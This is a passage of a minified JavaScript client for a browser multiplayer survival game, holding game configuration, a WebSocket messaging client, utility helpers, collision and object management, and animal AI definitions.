                var t = this.view.getFloat32(this.pos);
                return (this.pos += 4), t;
            }),
            (t.prototype.readF64 = function () {
                var t = this.view.getFloat64(this.pos);
                return (this.pos += 8), t;
            }),
            t
        );
    })(),
    rt =
    "u" > typeof globalThis
? globalThis
: "u" > typeof window
? window
: "u" > typeof global
? global
: "u" > typeof self
? self
: {},
    $t = {},
    Ca = {
        get exports() {
            return $t;
        },
        set exports(e) {
            $t = e;
        },
    },
    le = (Ca.exports = {});

function An() {
    throw Error("setTimeout has not been defined");
}

function Dn() {
    throw Error("clearTimeout has not been defined");
}

function Vr(t) {
    if (Ce === setTimeout) return setTimeout(t, 0);
    if ((Ce === An || !Ce) && setTimeout)
        return (Ce = setTimeout), setTimeout(t, 0);
    try {
        return Ce(t, 0);
    } catch {
        try {
            return Ce.call(null, t, 0);
        } catch {
            return Ce.call(this, t, 0);
        }
    }
}

function Aa(t) {
    if (Ae === clearTimeout) return clearTimeout(t);
    if ((Ae === Dn || !Ae) && clearTimeout)
        return (Ae = clearTimeout), clearTimeout(t);
    try {
        return Ae(t);
    } catch {
        try {
            return Ae.call(null, t);
        } catch {
            return Ae.call(this, t);
        }
    }
}
!(function () {
    try {
        Ce = "function" == typeof setTimeout ? setTimeout : An;
    } catch {
        Ce = An;
    }
    try {
        Ae = "function" == typeof clearTimeout ? clearTimeout : Dn;
    } catch {
        Ae = Dn;
    }
})();
var Qe,
    ze = [],
    Tt = !1,
    li = -1;

function Da() {
    Tt &&
        Qe &&
        ((Tt = !1),
         Qe.length ? (ze = Qe.concat(ze)) : (li = -1),
         ze.length && Ur());
}

function Ur() {
    if (!Tt) {
        var t = Vr(Da);
        Tt = !0;
        for (var n = ze.length; n; ) {
            for (Qe = ze, ze = []; ++li < n; ) Qe && Qe[li].run();
            (li = -1), (n = ze.length);
        }
        (Qe = null), (Tt = !1), Aa(t);
    }
}

function Lr(t, n) {
    (this.fun = t), (this.array = n);
}

function Fe() {}
(le.nextTick = function (t) {
    var n = Array(arguments.length - 1);
    if (arguments.length > 1)
        for (var i = 1; i < arguments.length; i++) n[i - 1] = arguments[i];
    ze.push(new Lr(t, n)), 1 !== ze.length || Tt || Vr(Ur);
}),
    (Lr.prototype.run = function () {
    this.fun.apply(null, this.array);
}),
    (le.title = "browser"),
    (le.browser = !0),
    (le.env = {}),
    (le.argv = []),
    (le.version = ""),
    (le.versions = {}),
    (le.on = Fe),
    (le.addListener = Fe),
    (le.once = Fe),
    (le.off = Fe),
    (le.removeListener = Fe),
    (le.removeAllListeners = Fe),
    (le.emit = Fe),
    (le.prependListener = Fe),
    (le.prependOnceListener = Fe),
    (le.listeners = function (t) {
    return [];
}),
    (le.binding = function (t) {
    throw Error("process.binding is not supported");
}),
    (le.cwd = function () {
    return "/";
}),
    (le.chdir = function (t) {
    throw Error("process.chdir is not supported");
}),
    (le.umask = function () {
    return 0;
});
const Oa = 1920,
      Ra = 1080,
      _a = 9,
      Nr = $t && -1 != $t.argv.indexOf("--largeserver") ? 80 : 40,
      Ba = Nr + 10,
      za = 6,
      Ha = 3e3,
      Fa = 10,
      Va = 5,
      Ua = 50,
      La = 4.5,
      Na = 15,
      qa = 0.9,
      Wa = 3e3,
      Xa = 60,
      Ga = 35,
      Ya = 3e3,
      $a = 500,
      Ka = $t && {}.IS_SANDBOX,
      Ja = 100,
      Qa = Math.PI / 2.6,
      Za = 10,
      ja = 0.25,
      el = Math.PI / 2,
      tl = 35,
      il = 0.0016,
      nl = 0.993,
      sl = 34,
      rl = [
          "#bf8f54",
          "#cbb091",
          "#896c4b",
          "#fadadc",
          "#ececec",
          "#c37373",
          "#4c4c4c",
          "#ecaff7",
          "#738cc3",
          "#8bc373",
      ],
      ol = 7,
      al = 0.06,
      ll = [
          "Sid",
          "Steph",
          "Bmoe",
          "Romn",
          "Jononthecool",
          "Fiona",
          "Vince",
          "Nathan",
          "Nick",
          "Flappy",
          "Ronald",
          "Otis",
          "Pepe",
          "Mc Donald",
          "Theo",
          "Fabz",
          "Oliver",
          "Jeff",
          "Jimmy",
          "Helena",
          "Reaper",
          "Ben",
          "Alan",
          "Naomi",
          "XYZ",
          "Clever",
          "Jeremy",
          "Mike",
          "Destined",
          "Stallion",
          "Allison",
          "Meaty",
          "Sophia",
          "Vaja",
          "Joey",
          "Pendy",
          "Murdoch",
          "Theo",
          "Jared",
          "July",
          "Sonia",
          "Mel",
          "Dexter",
          "Quinn",
          "Milky",
      ],
      cl = Math.PI / 3,
      ci = [
          {
              id: 0,
              src: "",
              xp: 0,
              val: 1,
          },
          {
              id: 1,
              src: "_g",
              xp: 3e3,
              val: 1.1,
          },
          {
              id: 2,
              src: "_d",
              xp: 7e3,
              val: 1.18,
          },
          {
              id: 3,
              src: "_r",
              poison: !0,
              xp: 12e3,
              val: 1.18,
          },
      ],
      hl = function (t) {
          let n = t.weaponXP[t.weaponIndex] || 0;
          for (let i = ci.length - 1; i >= 0; --i) if (n >= ci[i].xp) return ci[i];
      },
      fl = ["wood", "food", "stone", "points"],
      ul = 7,
      dl = 9,
      pl = 3,
      ml = 32,
      gl = 7,
      yl = 724,
      wl = 114,
      kl = 0.0011,
      vl = 1e-4,
      xl = 1.3,
      bl = [150, 160, 165, 175],
      Sl = [80, 85, 95],
      Tl = [80, 85, 90],
      Il = 2400,
      Ml = 0.75,
      El = 15,
      ts = 14400,
      Pl = 40,
      Cl = 2200,
      Al = 0.6,
      Dl = 1,
      Ol = 0.3,
      Rl = 0.3,
      _l = 144e4,
      is = 320,
      Bl = 100,
      zl = 2,
      Hl = 3200,
      Fl = 1440,
      Vl = 0.2,
      Ul = -1,
      Ll = 13960,
      Nl = 13960,
      T = {
          maxScreenWidth: 1920,
          maxScreenHeight: 1080,
          serverUpdateRate: 9,
          maxPlayers: Nr,
          maxPlayersHard: Ba,
          collisionDepth: 6,
          minimapRate: 3e3,
          colGrid: 10,
          clientSendRate: 5,
          healthBarWidth: 50,
          healthBarPad: 4.5,
          iconPadding: 15,
          iconPad: 0.9,
          deathFadeout: 3e3,
          crownIconScale: 60,
          crownPad: 35,
          chatCountdown: 3e3,
          chatCooldown: 500,
          inSandbox: Ka,
          maxAge: 100,
          gatherAngle: Qa,
          gatherWiggle: 10,
          hitReturnRatio: 0.25,
          hitAngle: el,
          playerScale: 35,
          playerSpeed: 0.0016,
          playerDecel: 0.993,
          nameY: 34,
          skinColors: rl,
          animalCount: 7,
          aiTurnRandom: 0.06,
          cowNames: ll,
          shieldAngle: cl,
          weaponVariants: ci,
          fetchVariant: hl,
          resourceTypes: fl,
          areaCount: 7,
          treesPerArea: 9,
          bushesPerArea: 3,
          totalRocks: 32,
          goldOres: 7,
          riverWidth: 724,
          riverPadding: 114,
          waterCurrent: 0.0011,
          waveSpeed: 1e-4,
          waveMax: 1.3,
          treeScales: bl,
          bushScales: Sl,
          rockScales: Tl,
          snowBiomeTop: 2400,
          snowSpeed: 0.75,
          maxNameLength: 15,
          mapScale: 14400,
          mapPingScale: 40,
          mapPingTime: 2200,
          volcanoScale: 320,
          innerVolcanoScale: 100,
          volcanoAnimalStrength: 2,
          volcanoAnimationDuration: 3200,
          volcanoAggressionRadius: 1440,
          volcanoAggressionPercentage: 0.2,
          volcanoDamagePerSecond: -1,
          volcanoLocationX: 13960,
          volcanoLocationY: 13960,
          MAX_ATTACK: 0.6,
          MAX_SPAWN_DELAY: 1,
          MAX_SPEED: 0.3,
          MAX_TURN_SPEED: 0.3,
          DAY_INTERVAL: 144e4,
      },
      ql = new ka(),
      Wl = new Pa(),
      ee = {
          socket: null,
          connected: !1,
          socketId: -1,
          connect: function (t, n, i) {
              if (this.socket) return;
              let o = this;
              try {
                  let a = !1;
                  (this.socket = new WebSocket(t)),
                      (this.socket.binaryType = "arraybuffer"),
                      (this.socket.onmessage = function (t) {
                      var n = new Uint8Array(t.data);
                      let a = Wl.decode(n),
                          r = a[0];
                      var n = a[1];
                      "io-init" == r ? (o.socketId = n[0]) : i[r].apply(void 0, n);
                  }),
                      (this.socket.onopen = function () {
                      (o.connected = !0), n();
                  }),
                      (this.socket.onclose = function (t) {
                      (o.connected = !1),
                          4001 == t.code ? n("Invalid Connection") : a || n("disconnected"),
                          (window.onbeforeunload = () => {}),
                          window.location.reload();
                  }),
                      (this.socket.onerror = function (t) {
                      this.socket &&
                          this.socket.readyState != WebSocket.OPEN &&
                          ((a = !0),
                           console.error("Socket error", arguments),
                           n("Socket error"));
                  });
              } catch (r) {
                  console.warn("Socket connection error:", r), n(r);
              }
          },
          send: function (t) {
              let n = Array.prototype.slice.call(arguments, 1),
                  i = ql.encode([t, n]);
              this.socket && this.socket.send(i);
          },
          socketReady: function () {
              return this.socket && this.connected;
          },
          close: function () {
              this.socket && this.socket.close(),
                  (this.socket = null),
                  (this.connected = !1);
          },
      };
var qr = Math.abs;
const Xl = Math.sqrt;
var qr = Math.abs;
const Gl = Math.atan2,
      Qi = Math.PI,
      Yl = function (t, n) {
          return Math.floor(Math.random() * (n - t + 1)) + t;
      },
      $l = function (t, n) {
          return Math.random() * (n - t + 1) + t;
      },
      Kl = function (t, n, i) {
          return t + (n - t) * i;
      },
      Jl = function (t, n) {
          return (
              t > 0 ? (t = Math.max(0, t - n)) : t < 0 && (t = Math.min(0, t + n)), t
          );
      },
      Ql = function (t, n, i, o) {
          return Xl((i -= t) * i + (o -= n) * o);
      },
      Zl = function (t, n, i, o) {
          return Gl(n - o, t - i);
      },
      jl = function (t, n) {
          let i = qr(n - t) % (2 * Qi);
          return i > Qi ? 2 * Qi - i : i;
      },
      ec = function (t) {
          return "number" == typeof t && !isNaN(t) && isFinite(t);
      },
      tc = function (t) {
          return t && "string" == typeof t;
      },
      ic = function (t) {
          return t > 999 ? (t / 1e3).toFixed(1) + "k" : t;
      },
      nc = function (t) {
          return t.charAt(0).toUpperCase() + t.slice(1);
      },
      sc = function (t, n) {
          return t ? parseFloat(t.toFixed(n)) : 0;
      },
      rc = function (t, n) {
          return parseFloat(n.points) - parseFloat(t.points);
      },
      oc = function (t, n, i, o, a, r, s, l) {
          let c = Math.min(a, s),
              d = Math.max(a, s);
          if ((d > i && (d = i), c < t && (c = t), c > d)) return !1;
          let h = r,
              u = l,
              p = s - a;
          if (Math.abs(p) > 1e-7) {
              let f = (l - r) / p,
                  $ = r - f * a;
              (h = f * c + $), (u = f * d + $);
          }
          return (
              (u = Math.max((h = Math.min(h, u)), u)) > o && (u = o),
              h < n && (h = n),
              !(h > u)
          );
      },
      Wr = function (t, n, i) {
          let o = t.getBoundingClientRect(),
              a = o.left + window.scrollX,
              r = o.top + window.scrollY,
              s = o.width,
              l = o.height;
          return n > a && n < a + s && i > r && i < r + l;
      },
      hi = function (t) {
          let n = t.changedTouches[0];
          (t.screenX = n.screenX),
              (t.screenY = n.screenY),
              (t.clientX = n.clientX),
              (t.clientY = n.clientY),
              (t.pageX = n.pageX),
              (t.pageY = n.pageY);
      },
      Xr = function (t, n) {
          let i = !n,
              o = !1;

          function a(n) {
              hi(n),
                  window.setUsingTouch(!0),
                  i && (n.preventDefault(), n.stopPropagation()),
                  o &&
                  (t.onclick && t.onclick(n),
                   t.onmouseout && t.onmouseout(n),
                   (o = !1));
          }
          t.addEventListener(
              "touchstart",
              Be(function n(a) {
                  hi(a),
                      window.setUsingTouch(!0),
                      i && (a.preventDefault(), a.stopPropagation()),
                      t.onmouseover && t.onmouseover(a),
                      (o = !0);
              }),
              !1
          ),
              t.addEventListener(
              "touchmove",
              Be(function n(a) {
                  hi(a),
                      window.setUsingTouch(!0),
                      i && (a.preventDefault(), a.stopPropagation()),
                      Wr(t, a.pageX, a.pageY)
                      ? o || (t.onmouseover && t.onmouseover(a), (o = !0))
                  : o && (t.onmouseout && t.onmouseout(a), (o = !1));
              }),
              !1
          ),
              t.addEventListener("touchend", Be(a), !1),
              t.addEventListener("touchcancel", Be(a), !1),
              t.addEventListener("touchleave", Be(a), !1);
      },
      ac = function (t) {
          for (; t.hasChildNodes(); ) t.removeChild(t.lastChild);
      },
      lc = function (t) {
          let n = document.createElement(t.tag || "div");

          function i(i, o) {
              t[i] && (n[o] = t[i]);
          }
          for (let o in (i("text", "textContent"),
                         i("html", "innerHTML"),
                         i("class", "className"),
                         t)) {
              switch (o) {
                  case "tag":
                  case "text":
                  case "html":
                  case "class":
                  case "style":
                  case "hookTouch":
                  case "parent":
                  case "children":
                      continue;
              }
              n[o] = t[o];
          }
          if (
              (n.onclick && (n.onclick = Be(n.onclick)),
               n.onmouseover && (n.onmouseover = Be(n.onmouseover)),
               n.onmouseout && (n.onmouseout = Be(n.onmouseout)),
               t.style && (n.style.cssText = t.style),
               t.hookTouch && Xr(n),
               t.parent && t.parent.appendChild(n),
               t.children)
          )
              for (let a = 0; a < t.children.length; a++) n.appendChild(t.children[a]);
          return n;
      },
      Gr = function (t) {
          return !t || "boolean" != typeof t.isTrusted || t.isTrusted;
      },
      Be = function (t) {
          return function (n) {
              n && n instanceof Event && Gr(n) && t(n);
          };
      },
      cc = function (t) {
          let n = "",
              i = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
          for (let o = 0; o < t; o++)
              n += i.charAt(Math.floor(Math.random() * i.length));
          return n;
      },
      hc = function (t, n) {
          let i = 0;
          for (let o = 0; o < t.length; o++) t[o] === n && i++;
          return i;
      },
      C = {
          randInt: Yl,
          randFloat: $l,
          lerp: Kl,
          decel: Jl,
          getDistance: Ql,
          getDirection: Zl,
          getAngleDist: jl,
          isNumber: ec,
          isString: tc,
          kFormat: ic,
          capitalizeFirst: nc,
          fixTo: sc,
          sortByPoints: rc,
          lineInRect: oc,
          containsPoint: Wr,
          mousifyTouchEvent: hi,
          hookTouchEvents: Xr,
          removeAllChildren: ac,
          generateElement: lc,
          eventIsTrusted: Gr,
          checkTrusted: Be,
          randomString: cc,
          countInArray: hc,
      },
      fc = function () {
          (this.init = function (t, n, i, o, a, r, s) {
              (this.x = t),
                  (this.y = n),
                  (this.color = s),
                  (this.scale = i),
                  (this.weight = 50),
                  (this.startScale = 0.625 * this.scale),
                  (this.maxScale = 1.5 * i),
                  (this.scaleSpeed = 0.7),
                  (this.speed = 0.18),
                  (this.speedMax = o),
                  (this.life = a),
                  (this.maxLife = a),
                  (this.text = r),
                  (this.movSpeed = 1 * Math.random() + 1),
                  (this.movAngle = 1 * Math.random() < 0.5);
          }),
              (this.update = function (t) {
              this.life &&
                  ((this.life -= t),
                   -0.35 != this.scaleSpeed
                   ? ((this.y += this.speed),
                      this.movAngle
                      ? (this.x -= this.speed * t * this.movSpeed)
                      : (this.x += this.speed * t * this.movSpeed))
                   : (this.y += this.speed * t),
                   (this.scale += this.scaleSpeed * (t / 4.5)),
                   (this.scale = Math.max(this.scale, this.startScale)),
                   this.speed < this.speedMax && (this.speed += 0.01 * this.speedMax),
                   this.scale >= this.maxScale &&
                   ((this.scale = this.maxScale),
                    (this.scaleSpeed *= -0.5),
                    (this.speed = 0.5 * this.speed)),
                   this.life <= 0 && (this.life = 0));
          }),
              (this.render = function (t, n, i) {
              (t.lineWidth = 10),
                  (t.strokeStyle = "#2b2b2b"),
                  (t.fillStyle = this.color),
                  (t.globalAlpha = (this.life / this.maxLife) * 2),
                  (t.font = this.scale + "px Hammersmith One"),
                  t.strokeText(this.text, this.x - n, this.y - i),
                  t.fillText(this.text, this.x - n, this.y - i),
                  (t.globalAlpha = 1);
          });
      },
      uc = function () {
          (this.texts = []),
              (this.update = function (t, n, i, o) {
              (n.textBaseline = "middle"), (n.textAlign = "center");
              for (let a = 0; a < this.texts.length; ++a)
                  this.texts[a].life &&
                      (this.texts[a].update(t), this.texts[a].render(n, i, o));
          }),
              (this.showText = function (t, n, i, o, a, r, s) {
              let l;
              for (let c = 0; c < this.texts.length; ++c)
                  if (!this.texts[c].life) {
                      l = this.texts[c];
                      break;
                  }
              l || ((l = new fc()), this.texts.push(l)), l.init(t, n, i, o, a, r, s);
          });
      },
      dc = function (t, n) {
          let i;
          (this.sounds = []),
              (this.active = !0),
              (this.play = function (n, o, a) {
              o &&
                  this.active &&
                  ((i = this.sounds[n]) ||
                   ((i = new Howl({
                  src: ".././sound/" + n + ".mp3",
              })),
                    (this.sounds[n] = i)),
                   (a && i.isPlaying) ||
                   ((i.isPlaying = !0),
                    i.play(),
                    i.volume((o || 1) * t.volumeMult),
                    i.loop(a)));
          }),
              (this.toggleMute = function (t, n) {
              (i = this.sounds[t]) && i.mute(n);
          }),
              (this.stop = function (t) {
              (i = this.sounds[t]) && (i.stop(), (i.isPlaying = !1));
          });
      },
      Os = Math.floor,
      Rs = Math.abs,
      Ot = Math.cos,
      Rt = Math.sin,
      pc = Math.sqrt;

function mc(t, n, i, o, a, r) {
    (this.objects = n), (this.grids = {}), (this.updateObjects = []);
    let s,
        l,
        c = o.mapScale / o.colGrid;
    (this.setObjectGrids = function (t) {
        let n = Math.min(o.mapScale, Math.max(0, t.x)),
            i = Math.min(o.mapScale, Math.max(0, t.y));
        for (let a = 0; a < o.colGrid; ++a) {
            s = a * c;
            for (let r = 0; r < o.colGrid; ++r)
                (l = r * c),
                    n + t.scale >= s &&
                    n - t.scale <= s + c &&
                    i + t.scale >= l &&
                    i - t.scale <= l + c &&
                    (this.grids[a + "_" + r] || (this.grids[a + "_" + r] = []),
                     this.grids[a + "_" + r].push(t),
                     t.gridLocations.push(a + "_" + r));
        }
    }),
        (this.removeObjGrid = function (t) {
        let n;
        for (let i = 0; i < t.gridLocations.length; ++i)
            (n = this.grids[t.gridLocations[i]].indexOf(t)) >= 0 &&
                this.grids[t.gridLocations[i]].splice(n, 1);
    }),
        (this.disableObj = function (t) {
        if (((t.active = !1), r)) {
            t.owner && t.pps && (t.owner.pps -= t.pps), this.removeObjGrid(t);
            let n = this.updateObjects.indexOf(t);
            n >= 0 && this.updateObjects.splice(n, 1);
        }
    }),
        (this.hitObj = function (t, n) {
        for (let o = 0; o < a.length; ++o)
            a[o].active &&
                (t.sentTo[a[o].id] &&
                 (t.active
                  ? a[o].canSee(t) && r.send(a[o].id, "L", i.fixTo(n, 1), t.sid)
                  : r.send(a[o].id, "Q", t.sid)),
                 t.active || t.owner != a[o] || a[o].changeItemCount(t.group.id, -1));
    });
    let d = [],
        h;
    this.getGridArrays = function (t, n, i) {
        (s = Os(t / c)), (l = Os(n / c)), (d.length = 0);
        try {
            this.grids[s + "_" + l] && d.push(this.grids[s + "_" + l]),
                t + i >= (s + 1) * c &&
                ((h = this.grids[s + 1 + "_" + l]) && d.push(h),
                 l && n - i <= l * c
                 ? (h = this.grids[s + 1 + "_" + (l - 1)]) && d.push(h)
                 : n + i >= (l + 1) * c &&
                 (h = this.grids[s + 1 + "_" + (l + 1)]) &&
                 d.push(h)),
                s &&
                t - i <= s * c &&
                ((h = this.grids[s - 1 + "_" + l]) && d.push(h),
                 l && n - i <= l * c
                 ? (h = this.grids[s - 1 + "_" + (l - 1)]) && d.push(h)
                 : n + i >= (l + 1) * c &&
                 (h = this.grids[s - 1 + "_" + (l + 1)]) &&
                 d.push(h)),
                n + i >= (l + 1) * c &&
                (h = this.grids[s + "_" + (l + 1)]) &&
                d.push(h),
                l && n - i <= l * c && (h = this.grids[s + "_" + (l - 1)]) && d.push(h);
        } catch {}
        return d;
    };
    let u;
    (this.add = function (i, o, a, s, l, c, d, h, p) {
        u = null;
        for (var f = 0; f < n.length; ++f)
            if (n[f].sid == i) {
                u = n[f];
                break;
            }
        if (!u) {
            for (var f = 0; f < n.length; ++f)
                if (!n[f].active) {
                    u = n[f];
                    break;
                }
        }
        u || ((u = new t(i)), n.push(u)),
            h && (u.sid = i),
            u.init(o, a, s, l, c, d, p),
            r && (this.setObjectGrids(u), u.doUpdate && this.updateObjects.push(u));
    }),
        (this.disableBySid = function (t) {
        for (let i = 0; i < n.length; ++i)
            if (n[i].sid == t) {
                this.disableObj(n[i]);
                break;
            }
    }),
        (this.removeAllItems = function (t, i) {
        for (let o = 0; o < n.length; ++o)
            n[o].active &&
                n[o].owner &&
                n[o].owner.sid == t &&
                this.disableObj(n[o]);
        i && i.broadcast("R", t);
    }),
        (this.fetchSpawnObj = function (t) {
        let i = null;
        for (let o = 0; o < n.length; ++o)
            if ((u = n[o]).active && u.owner && u.owner.sid == t && u.spawnPoint) {
                (i = [u.x, u.y]),
                    this.disableObj(u),
                    r.broadcast("Q", u.sid),
                    u.owner && u.owner.changeItemCount(u.group.id, -1);
                break;
            }
        return i;
    }),
        (this.checkItemLocation = function (t, n, i, a, r) {
        let s = {
            x: t,
            y: n,
        };
        return (
            !ue.objects.find(
                (t) =>
                t.active &&
                cdf(s, t) < r + (t.blocker ? t.blocker : t.getScale(i, t.isItem))
            ) &&
            (18 == a ||
             !(n >= o.mapScale / 2 - o.riverWidth / 2) ||
             !(n <= o.mapScale / 2 + o.riverWidth / 2))
        );
    }),
        (this.addProjectile = function (t, n, o, r, s) {
        let l = items.projectiles[s],
            c;
        for (let d = 0; d < projectiles.length; ++d)
            if (!projectiles[d].active) {
                c = projectiles[d];
                break;
            }
        c || ((c = new Projectile(a, i)), projectiles.push(c)),
            c.init(s, t, n, o, l.speed, r, l.scale);
    }),
        (this.checkCollision = function (t, n, a) {
        a = a || 1;
        let r = t.x - n.x,
            s = t.y - n.y,
            l = t.scale + n.scale;
        if (Rs(r) <= l || Rs(s) <= l) {
            l = t.scale + (n.getScale ? n.getScale() : n.scale);
            let c = pc(r * r + s * s) - l;
            if (c <= 0) {
                if (n.ignoreCollision)
                    !n.trap ||
                        t.noTrap ||
                        n.owner == t ||
                        (n.owner && n.owner.team && n.owner.team == t.team)
                        ? n.boostSpeed
                        ? ((t.xVel += a * n.boostSpeed * (n.weightM || 1) * Ot(n.dir)),
                           (t.yVel += a * n.boostSpeed * (n.weightM || 1) * Rt(n.dir)))
                    : n.healCol
                        ? (t.healCol = n.healCol)
                    : n.teleport &&
                        ((t.x = i.randInt(0, o.mapScale)),
                         (t.y = i.randInt(0, o.mapScale)))
                    : ((t.lockMove = !0), (n.hideFromEnemy = !1));
                else {
                    let d = i.getDirection(t.x, t.y, n.x, n.y);
                    if (
                        (i.getDistance(t.x, t.y, n.x, n.y),
                         n.isPlayer
                         ? ((c = (-1 * c) / 2),
                            (t.x += c * Ot(d)),
                            (t.y += c * Rt(d)),
                            (n.x -= c * Ot(d)),
                            (n.y -= c * Rt(d)))
                         : ((t.x = n.x + l * Ot(d)),
                            (t.y = n.y + l * Rt(d)),
                            (t.xVel *= 0.75),
                            (t.yVel *= 0.75)),
                         n.dmg &&
                         n.owner != t &&
                         !(n.owner && n.owner.team && n.owner.team == t.team))
                    ) {
                        t.changeHealth(-n.dmg, n.owner, n);
                        let h = 1.5 * (n.weightM || 1);
                        (t.xVel += h * Ot(d)),
                            (t.yVel += h * Rt(d)),
                            n.pDmg &&
                            !(t.skin && t.skin.poisonRes) &&
                            ((t.dmgOverTime.dmg = n.pDmg),
                             (t.dmgOverTime.time = 5),
                             (t.dmgOverTime.doer = n.owner)),
                            t.colDmg &&
                            n.health &&
                            (n.changeHealth(-t.colDmg) && this.disableObj(n),
                             this.hitObj(n, i.getDirection(t.x, t.y, n.x, n.y)));
                    }
                }
                return n.zIndex > t.zIndex && (t.zIndex = n.zIndex), !0;
            }
        }
        return !1;
    });
}

function gc(t, n, i, o, a, r, s, l, c) {
    this.addProjectile = function (d, h, u, p, f, $, g, m, _) {
        let k = r.projectiles[$],
            v;
        for (let b = 0; b < n.length; ++b)
            if (!n[b].active) {
                v = n[b];
                break;
            }
        return (
            v || (((v = new t(i, o, a, r, s, l, c)).sid = n.length), n.push(v)),
            v.init($, d, h, u, f, k.dmg, p, k.scale, g),
            (v.ignoreObj = m),
            (v.layer = _ || k.layer),
            (v.src = k.src),
            v
        );
    };
}

function yc(t, n, i, o, a, r, s, l, c) {
    (this.aiTypes = [
        {
            id: 0,
            src: "cow_1",
            killScore: 150,
            health: 500,
            weightM: 0.8,
            speed: 95e-5,
            turnSpeed: 0.001,
            scale: 72,
            drop: ["food", 50],
        },
        {
            id: 1,
            src: "pig_1",
            killScore: 200,
            health: 800,
            weightM: 0.6,
            speed: 85e-5,
            turnSpeed: 0.001,
            scale: 72,
            drop: ["food", 80],
        },
        {
            id: 2,
            name: "Bull",
            src: "bull_2",
            hostile: !0,
            dmg: 20,
            killScore: 1e3,
            health: 1800,
            weightM: 0.5,
            speed: 94e-5,
            turnSpeed: 74e-5,
            scale: 78,
            viewRange: 800,
            chargePlayer: !0,
            drop: ["food", 100],
        },
        {
            id: 3,
            name: "Bully",
            src: "bull_1",
            hostile: !0,
            dmg: 20,
            killScore: 2e3,
            health: 2800,
            weightM: 0.45,
            speed: 0.001,
            turnSpeed: 8e-4,
            scale: 90,
            viewRange: 900,
            chargePlayer: !0,
            drop: ["food", 400],
        },
        {
            id: 4,
            name: "Wolf",
            src: "wolf_1",
            hostile: !0,
            dmg: 8,
            killScore: 500,
            health: 300,
            weightM: 0.45,
            speed: 0.001,
            turnSpeed: 0.002,
            scale: 84,
            viewRange: 800,
            chargePlayer: !0,
            drop: ["food", 200],
        },
        {
            id: 5,
            name: "Quack",
            src: "chicken_1",
            dmg: 8,
            killScore: 2e3,
            noTrap: !0,
            health: 300,
            weightM: 0.2,
            speed: 0.0018,
            turnSpeed: 0.006,
            scale: 70,
            drop: ["food", 100],
        },
        {
            id: 6,
            name: "MOOSTAFA",
            nameScale: 50,
            src: "enemy",
            hostile: !0,
            dontRun: !0,
            fixedSpawn: !0,
            spawnDelay: 6e4,
            noTrap: !0,
            colDmg: 100,
            dmg: 40,
            killScore: 8e3,
            health: 18e3,
            weightM: 0.4,
            speed: 7e-4,
            turnSpeed: 0.01,
            scale: 80,
            spriteMlt: 1.8,
            leapForce: 0.9,
            viewRange: 1e3,
            hitRange: 210,
            hitDelay: 1e3,
            chargePlayer: !0,
            drop: ["food", 100],
        },
        {
            id: 7,
            name: "Treasure",
            hostile: !0,
            nameScale: 35,
            src: "crate_1",
            fixedSpawn: !0,
            spawnDelay: 12e4,
            colDmg: 200,
            killScore: 5e3,
            health: 2e4,
            weightM: 0.1,
            speed: 0,
            turnSpeed: 0,
            scale: 70,
            spriteMlt: 1,
        },
        {
            id: 8,
            name: "MOOFIE",
            src: "wolf_2",
            hostile: !0,
            fixedSpawn: !0,
            dontRun: !0,
            hitScare: 4,
            spawnDelay: 3e4,
            noTrap: !0,
            nameScale: 35,
            dmg: 10,
            colDmg: 100,
            killScore: 3e3,
            health: 7e3,
            weightM: 0.45,
            speed: 0.0015,
            turnSpeed: 0.002,
            scale: 90,
            viewRange: 800,
            chargePlayer: !0,
            drop: ["food", 1e3],
        },
        {
            id: 9,
            name: "\uD83D\uDC80MOOFIE\uD83D\uDC80",
            src: "wolf_2",
            hostile: !0,
            fixedSpawn: !0,
            dontRun: !0,
            hitScare: 50,
            spawnDelay: 6e4,
            noTrap: !0,
            nameScale: 35,
            dmg: 12,
            colDmg: 100,
            killScore: 3e3,
            health: 9e3,
            weightM: 0.45,
            speed: 0.0015,
            turnSpeed: 0.0025,
            scale: 94,
            viewRange: 1440,
            chargePlayer: !0,
            drop: ["food", 3e3],
            minSpawnRange: 0.85,
            maxSpawnRange: 0.9,
        },
        {
            id: 10,
            name: "\uD83D\uDC80Wolf\uD83D\uDC80",
            src: "wolf_1",
            hostile: !0,
            fixedSpawn: !0,
            dontRun: !0,
            hitScare: 50,
            spawnDelay: 3e4,
            dmg: 10,
            killScore: 700,
            health: 500,
            weightM: 0.45,
            speed: 0.00115,
            turnSpeed: 0.0025,
            scale: 88,
            viewRange: 1440,
            chargePlayer: !0,
            drop: ["food", 400],
            minSpawnRange: 0.85,
            maxSpawnRange: 0.9,
        },
        {
            id: 11,
            name: "\uD83D\uDC80Bully\uD83D\uDC80",
            src: "bull_1",
            hostile: !0,
            fixedSpawn: !0,
            dontRun: !0,
            hitScare: 50,
            dmg: 20,
            killScore: 5e3,
            health: 5e3,
            spawnDelay: 1e5,
            weightM: 0.45,
            speed: 0.00115,
            turnSpeed: 0.0025,
            scale: 94,
            viewRange: 1440,
            chargePlayer: !0,
            drop: ["food", 800],
            minSpawnRange: 0.85,
            maxSpawnRange: 0.9,
        },
    ]),
        (this.spawn = function (d, h, u, p) {
        if (!this.aiTypes[p])
            return console.error("missing ai type", p), this.spawn(d, h, u, 0);
        let f;
        for (let $ = 0; $ < t.length; ++$)
            if (!t[$].active) {
                f = t[$];
                break;
            }
        return (
            f || ((f = new n(t.length, a, i, o, s, r, l, c)), t.push(f)),
            f.init(d, h, u, p, this.aiTypes[p]),
            f
        );
    });
}
const ot = 2 * Math.PI,
      Zi = 0;

function wc(t, n, i, o, a, r, s, l) {
    (this.sid = t),
        (this.isAI = !0),
        (this.nameIndex = a.randInt(0, r.cowNames.length - 1)),
        (this.init = function (t, n, i, o, a) {
        (this.x = t),
            (this.y = n),
            (this.startX = a.fixedSpawn ? t : null),
            (this.startY = a.fixedSpawn ? n : null),
            (this.xVel = 0),
            (this.yVel = 0),
            (this.zIndex = 0),
            (this.dir = i),
            (this.dirPlus = 0),
            (this.index = o),
            (this.src = a.src),
            a.name && (this.name = a.name),
            (this.name || "").startsWith("\uD83D\uDC80") && (this.isVolcanoAi = !0),
            (this.weightM = a.weightM),
            (this.speed = a.speed),
            (this.killScore = a.killScore),
            (this.turnSpeed = a.turnSpeed),
            (this.scale = a.scale),
            (this.maxHealth = a.health),
            (this.leapForce = a.leapForce),
            (this.health = this.maxHealth),
            (this.lastHealth = this.health),
            (this.chargePlayer = a.chargePlayer),
            (this.viewRange = a.viewRange),
            (this.drop = a.drop),
            (this.dmg = a.dmg),
            (this.hostile = a.hostile),
            (this.dontRun = a.dontRun),
            (this.hitRange = a.hitRange),
